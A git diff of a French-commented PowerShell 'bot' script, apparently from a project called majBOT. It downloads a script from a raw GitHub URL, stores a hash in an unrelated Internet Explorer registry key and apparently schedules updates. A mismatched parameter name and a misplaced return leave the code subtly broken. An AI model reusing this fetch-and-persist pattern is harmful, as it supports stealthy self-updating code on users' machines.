@@ -1,13 +1,21 @@
 Import-Module "c:\lib\script1.ps1"
 
-Function recupscript {
+<# variables #>
+##Paramètres de la clé registre crée
+ $cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
+ $nomCle    = 'bot1'
+ $typeCle   = "String"
+
+
+
+Function recupscript($hash,$vaActuelle, $convert64) {
 #Chemin du script
 $gitLink   = 'https://raw.githubusercontent.com/theurtebize/majBOT/master/script.ps1'
 
-#Paramètres de la clé registre crée
-$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
-$nomCle    = 'bot1'
-$typeCle   = "String"
+##Paramètres de la clé registre crée
+#$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
+#$nomCle    = 'bot1'
+#$typeCle   = "String"
 
 #Récupération du git
 $recupGit = Invoke-WebRequest -Uri $gitLink -UseBasicParsing 
@@ -29,16 +37,16 @@ try{
 }catch{
     New-ItemProperty -Path $cheminCle -Name valActuelle -PropertyType String -Value $hash
 }
-
+    return $convert64
     echo "je suis bien passé dans recupscript"
 }
 
 
-Function update {
+Function update($hash,$vaActuelle) {
 
-$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
-$nomCle    = 'bot1'
-$typeCle   = "String"
+#$cheminCle = 'registry::HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main'
+#$nomCle    = 'bot1'
+#$typeCle   = "String"
 #Mise à jour si besoin avec comparaison 
 if ($hash -ne $valActuelle){
     #Ne rien faire
@@ -100,3 +108,6 @@ switch ($option){
     createtacheupdate {createtacheupdate }
 
 }
+
+recupscript
+update
